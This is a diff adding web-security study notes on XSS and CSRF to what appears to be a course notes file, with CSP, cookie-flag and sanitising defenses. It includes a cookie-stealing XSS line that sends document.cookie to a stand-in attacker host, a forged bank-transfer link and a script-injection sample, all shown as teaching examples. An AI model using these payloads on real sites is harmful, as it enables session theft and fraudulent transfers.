@@ -891,6 +891,64 @@ For Node
 
 > Wow.. this website is recommended by so many instructors
 
+### 262. XSS + CSRF
+
+- XSS : Cross Site Scripting
+
+```js
+// popular XSS
+window.location = 'haxxed.com?cookie=' + document.cookie;
+```
+
+- CSRF : Cross Site Request Forgery
+
+For example, many scam emails
+
+```html
+<a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read more!</a>
+```
+
+It can be prevented by CSP (Content Security Policy)
+
+#### Solutions
+
+1. Sanitize Input
+2. No eval()
+3. No document.write()
+   ```js
+   document.write('<script>alert(1)</script>');
+   ```
+4. CSP : Content Security Policy
+   ```js
+   // Node
+   res.set({
+     'Content-Security-Policy': "script-src 'self' https://apis.google.com"
+   });
+   ```
+   ```html
+   <meta
+     http-equiv="Content-Security-Policy"
+     content="default-src 'self'; img-src https://*; child-src 'none';"
+   />
+   ```
+5. Secure + HTTPOnly Cookies
+   ```js
+   res.cookie('session', '1', { httpOnly: true });
+   res.cookie('session', '1', { secure: true });
+   ```
+
+[npm csurf - Node.js CSRF protection middleware](https://www.npmjs.com/package/csurf)
+
+### 263. Exercise: #3 - XSS + CSRF
+
+- [XSS Exercise](https://www.hacksplaining.com/exercises/xss-stored#/loafing-about)
+- [CSRF Exercise](https://www.hacksplaining.com/exercises/csrf#/start)
+
+### 264. Resources: XSS + CSRF
+
+- [CSP : Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
+
 </details>
 
 # Next Step
